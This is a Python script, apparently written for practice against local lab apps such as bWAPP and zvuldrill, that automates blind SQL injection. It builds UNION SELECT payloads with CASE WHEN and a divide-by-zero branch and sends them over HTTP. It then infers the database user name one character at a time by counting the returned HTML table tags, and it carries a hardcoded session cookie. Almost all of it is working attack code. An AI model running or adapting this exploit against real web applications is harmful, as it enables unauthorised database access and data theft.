from urllib import request
import urllib
from bs4 import BeautifulSoup
import time
import cProfile



class getUser():

    payloads = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u",
                "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "@", "_", "."] #判断user字段

    userStr = [] #输出的user字段

    orderByStr = "" #页面可显示的字段数

    url = "" # 固定的sql注入语句

    #def _init_(self,url,orderBy,keyTag)

    def getUserBybs4(self, url, orderBy, keyTag, keyTagLen, Cookie=False):

        for i in range(1, int(orderBy) + 1):  #增加orderby字段
            self.orderByStr += str(i) + ","

        self.orderByStr = self.orderByStr[:-1] #去除最后一个字节

        for position in range(1, 10):

            for i in self.payloads:

                self.url = "+union+select+" + self.orderByStr + "+from+information_schema.schemata+where+case+when+ASCII(MID(LOWER(user())," + str(
                    position) + ",1))=ASCII(%22" + i + "%22)+then+1+else+2/0+end+%23"

                # 2/0可以被0或者x/0代替
                # dataBaseName只要是存在的数据库都行

                # print("%s"%(url+self.url))

                req = urllib.request.Request(url + self.url)

                req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0')

                if(Cookie!=False):
                    req.add_header('Cookie', 'security_level=0; PHPSESSID=ug6rqbmjkr62f1nv9jmndr5r84')

                with request.urlopen(req) as f:
                    # print('Status:', f.status, f.reason)
                    # for k, v in f.getheaders():
                    #     print('%s: %s' % (k, v))
                    a = f.read().decode('utf-8')

                #print(a)
                soup = BeautifulSoup(a, 'html.parser')
                # print(len(a))
                print(len(soup.find_all("td")))

                #print("%s"%len(soup.find_all(keyTag))) #输出标签长度

                if len(soup.find_all(keyTag)) == int(keyTagLen):
                    self.userStr.append(i)

        print("".join(str(i) for i in self.userStr))  # 输出当前内容



    def getUserT1(self, url, orderBy, keyTag, keyTagLen, Cookie=False):
        for i in range(1, int(orderBy) + 1):  # 增加orderby字段
            self.orderByStr += str(i) + ","

        self.orderByStr = self.orderByStr[:-1]  # 去除最后一个字节
        self.url = "+union+select+" + self.orderByStr + "+from+information_schema.schemata+where+case+when+ASCII(MID(LOWER(user()),1,1))=ASCII(%22r%22)+then+1+else+2/0+end+%23"

        # 2/0可以被0或者x/0代替
        # dataBaseName只要是存在的数据库都行

        # print("%s"%(url+self.url))

        req = urllib.request.Request(url + self.url)

        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0')
        #
        if (Cookie==True):
            req.add_header('Cookie', 'security_level=0; PHPSESSID=ug6rqbmjkr62f1nv9jmndr5r84')  #head中加入Cookie会大大延长访问时间
        #
        # with request.urlopen(req) as f:
        #     # print('Status:', f.status, f.reason)
        #     # for k, v in f.getheaders():
        #     #     print('%s: %s' % (k, v))
        #     #a = f.read().decode('utf-8') #解码会加长时间
        #     a = f.read()
        webpage = urllib.request.urlopen(req)

        a = webpage.read()

        print(a)
        print(len(a))

        soup = BeautifulSoup(a, 'html.parser')

        print(len(soup.find_all("td")))

        # print("%s"%len(soup.find_all(keyTag))) #输出标签长度

        # if len(soup.find_all(keyTag)) == int(keyTagLen):
        #     self.userStr.append(i)

        #print("".join(str(i) for i in self.userStr))  # 输出当前内容
        #cProfile.run('your_method()')


if __name__ == "__main__":
    # +union+select 1,2,3,4,5,6,7 from movies where case when ASCII(MID(LOWER(user()),1,1))=114 then 1 else 2/0 end

    User = getUser()

    url1 = "http://192.168.52.128/test2/zvuldrill-master/search.php?search=1%'"  # 可行

    url2 = "http://192.168.52.128/bWAPP/bWAPP/sqli_2.php?action=go&movie=100"

   #User.getUserBybs4(url2,"7","td","19")

    User.getUserT1(url2,"7","td","19")